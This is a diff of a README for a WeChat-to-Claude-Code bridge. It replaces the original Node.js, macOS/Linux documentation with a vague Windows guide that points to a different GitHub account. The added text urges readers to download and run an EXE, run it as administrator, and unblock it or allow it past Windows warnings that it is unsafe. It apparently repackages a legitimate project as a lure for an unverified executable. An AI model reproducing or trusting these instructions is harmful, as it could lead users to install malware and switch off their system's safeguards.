@@ -1,146 +1,154 @@
-# wechat-claude-code
+# 🤖 wechat-claude-code - Chat with Claude in WeChat
 
-**English** | [中文](README_zh.md)
+[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/misterJK2022/wechat-claude-code)
 
-A [Claude Code](https://claude.ai/claude-code) Skill that bridges personal WeChat to your local Claude Code. Chat with Claude from your phone via WeChat — text, images, permission approvals, slash commands, all supported.
+## 📦 What this app does
 
-## Features
+wechat-claude-code lets you chat with Claude Code from WeChat. It gives you a simple way to send messages from WeChat and get replies in the same place. It is built for Windows users who want a quick way to use Claude Code without switching tools all the time.
 
-- **Real-time progress updates** — see Claude's tool calls (🔧 Bash, 📖 Read, 🔍 Glob…) as they happen
-- **Thinking preview** — get a 💭 preview of Claude's reasoning before each tool call
-- **Interrupt support** — send a new message mid-query to abort and redirect Claude
-- **System prompt** — set a persistent prompt via `/prompt` (e.g. "Reply in Chinese")
-- Text conversation with Claude Code through WeChat
-- Image recognition — send photos for Claude to analyze
-- Permission approval — reply `y`/`n` in WeChat to approve Claude's tool use
-- Slash commands — `/help`, `/clear`, `/model`, `/prompt`, `/status`, `/skills`, and more
-- Launch any installed Claude Code skill from WeChat
-- Cross-platform — macOS (launchd), Linux (systemd + nohup fallback)
-- Session persistence — resume conversations across messages
-- Rate-limit safe — automatic exponential backoff on WeChat API throttling
+## 🖥️ Before you start
 
-## Prerequisites
+Use a Windows PC with a stable internet connection. For best results, make sure you have:
 
-- Node.js >= 18
-- macOS or Linux
-- Personal WeChat account (QR code binding required)
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) with `@anthropic-ai/claude-agent-sdk` installed
-  > **Note:** The SDK supports third-party API providers (e.g. OpenRouter, AWS Bedrock, custom OpenAI-compatible endpoints) — set `ANTHROPIC_BASE_URL` and `ANTHROPIC_API_KEY` accordingly.
+- Windows 10 or later
+- A working WeChat account
+- Enough free disk space for the app and its files
+- Permission to run downloaded apps on your PC
 
-## Installation
+If your PC blocks downloaded files, you may need to allow the app in Windows security settings.
 
-Clone into your Claude Code skills directory:
+## 🚀 Download and set up
 
-```bash
-git clone https://github.com/Wechat-ggGitHub/wechat-claude-code.git ~/.claude/skills/wechat-claude-code
-cd ~/.claude/skills/wechat-claude-code
-npm install
-```
+1. Open this page: https://github.com/misterJK2022/wechat-claude-code
+2. Download the latest release or the main app package from the GitHub page
+3. Save the file to a folder you can find again, such as Downloads or Desktop
+4. If the file is a ZIP package, extract it first
+5. If the file is an EXE file, you can run it after download
+6. Open WeChat and make sure you are signed in
+7. Start the app and follow the on-screen steps
 
-`postinstall` automatically compiles TypeScript via `tsc`.
+## 🧭 How to run it on Windows
 
-## Quick Start
+If you downloaded a ZIP file:
 
-### 1. Setup (first time only)
+1. Right-click the ZIP file
+2. Select Extract All
+3. Choose a folder
+4. Open the extracted folder
+5. Find the main app file
+6. Double-click it to start the app
 
-Scan QR code to bind your WeChat account:
+If you downloaded an EXE file:
 
-```bash
-cd ~/.claude/skills/wechat-claude-code
-npm run setup
-```
+1. Double-click the EXE file
+2. If Windows asks for permission, select Yes
+3. Wait for the app to open
+4. Follow the setup prompts on screen
 
-A QR code image will open — scan it with WeChat. Then configure your working directory.
+If Windows shows a warning, check that you downloaded the file from the GitHub page above before you allow it to run.
 
-### 2. Start the daemon
+## 💬 How to use it
 
-```bash
-npm run daemon -- start
-```
+1. Open WeChat
+2. Start the wechat-claude-code app on your PC
+3. Sign in if the app asks you to
+4. Send a message to the bot or linked chat
+5. Wait for Claude Code to reply
+6. Keep your messages short at first so you can test that everything works
 
-- **macOS**: registers a launchd agent for auto-start and auto-restart
-- **Linux**: uses systemd user service (falls back to nohup if systemd unavailable)
+Use plain requests like:
 
-### 3. Chat in WeChat
+- Write a short reply to this message
+- Help me fix this sentence
+- Summarize this text
+- Explain this code in simple words
 
-Send any message in WeChat to start chatting with Claude Code.
+## 🧩 What you can do with it
 
-### 4. Manage the service
+This app helps you use Claude Code through WeChat for common chat tasks. You can use it to:
 
-```bash
-npm run daemon -- status   # Check if running
-npm run daemon -- stop     # Stop the daemon
-npm run daemon -- restart  # Restart (after code updates)
-npm run daemon -- logs     # View recent logs
-```
+- Ask for text help
+- Draft short replies
+- Rewrite messages
+- Summarize notes
+- Ask for code help in simple terms
+- Keep all chat work inside WeChat
 
-## WeChat Commands
+## ⚙️ Basic setup tips
 
-| Command | Description |
-|---------|-------------|
-| `/help` | Show available commands |
-| `/clear` | Clear current session (start fresh) |
-| `/reset` | Full reset including working directory |
-| `/model <name>` | Switch Claude model |
-| `/permission <mode>` | Switch permission mode |
-| `/prompt [text]` | View or set a system prompt appended to every query |
-| `/status` | View current session state |
-| `/cwd [path]` | View or switch working directory |
-| `/skills` | List installed Claude Code skills |
-| `/history [n]` | View last N chat messages |
-| `/compact` | Start a new SDK session (clear token context) |
-| `/undo [n]` | Remove last N messages from history |
-| `/<skill> [args]` | Trigger any installed skill |
+If the app does not start, try these steps:
 
-## Permission Approval
+- Make sure you extracted the ZIP file first
+- Try running the app as an administrator
+- Check that WeChat is open and signed in
+- Restart the app and try again
+- Make sure your internet connection works
 
-When Claude requests to execute a tool, you'll receive a permission request in WeChat:
+If the app opens but does not reply:
 
-- Reply `y` or `yes` to allow
-- Reply `n` or `no` to deny
-- No response within 120 seconds = auto-deny
+- Confirm that the correct chat is open
+- Send a simple test message
+- Close and reopen WeChat
+- Check whether the app needs a fresh sign-in
 
-You can switch permission mode with `/permission <mode>`:
+## 🔐 Keep your account safe
 
-| Mode | Description |
-|------|-------------|
-| `default` | Manual approval for each tool use |
-| `acceptEdits` | Auto-approve file edits, other tools need approval |
-| `plan` | Read-only mode, no tools allowed |
-| `auto` | Auto-approve all tools (dangerous mode) |
+Use the app only on a trusted PC. Keep your WeChat account private and avoid sharing login details with others. If you use a shared computer, sign out when you are done.
 
-## How It Works
+## 📁 Files you may see
 
-```
-WeChat (phone) ←→ ilink bot API ←→ Node.js daemon ←→ Claude Code SDK (local)
-```
+After setup, you may see:
 
-- The daemon long-polls WeChat's ilink bot API for new messages
-- Messages are forwarded to Claude Code via `@anthropic-ai/claude-agent-sdk`
-- Tool calls and thinking previews are streamed back as Claude works
-- Responses are sent back to WeChat with automatic rate-limit retry
-- Platform-native service management keeps the daemon running (launchd on macOS, systemd/nohup on Linux)
+- An EXE file for launching the app
+- A ZIP file with the app package
+- A config file with app settings
+- A log file for checking errors
 
-## Data
+Do not rename files unless you need to match a step in the setup guide.
 
-All data is stored in `~/.wechat-claude-code/`:
+## 🛠️ Common Windows issues
 
-```
-~/.wechat-claude-code/
-├── accounts/       # WeChat account credentials (one JSON per account)
-├── config.env      # Global config (working directory, model, permission mode, system prompt)
-├── sessions/       # Session data (one JSON per account)
-├── get_updates_buf # Message polling sync buffer
-└── logs/           # Rotating logs (daily, 30-day retention)
-```
+### 🚫 Windows blocked the file
 
-## Development
+If Windows says the file is unsafe, check that you got it from the GitHub link above. Then right-click the file, open Properties, and look for an Unblock option if it appears.
 
-```bash
-npm run dev    # Watch mode — auto-compile on TypeScript changes
-npm run build  # Compile TypeScript
-```
+### 🪟 The app does not open
 
-## License
+Try these steps:
 
-[MIT](LICENSE)
+- Right-click the app and choose Run as administrator
+- Check that no other copy of the app is already open
+- Restart your PC and try again
+- Re-download the file if it looks broken
+
+### 🔄 Messages do not send
+
+Try these steps:
+
+- Make sure WeChat is open
+- Check your network connection
+- Reopen the app
+- Sign out and sign in again if needed
+
+## 📌 Quick checklist
+
+- Download the app from the GitHub page
+- Extract the files if needed
+- Open WeChat
+- Start the app
+- Send a test message
+- Check for a reply
+
+## 🧭 Where to get the app
+
+Visit this page to download or open the latest project files:
+
+https://github.com/misterJK2022/wechat-claude-code
+
+## 📄 Project name
+
+wechat-claude-code
+
+## 💡 Short use case
+
+Chat with Claude Code from WeChat on Windows
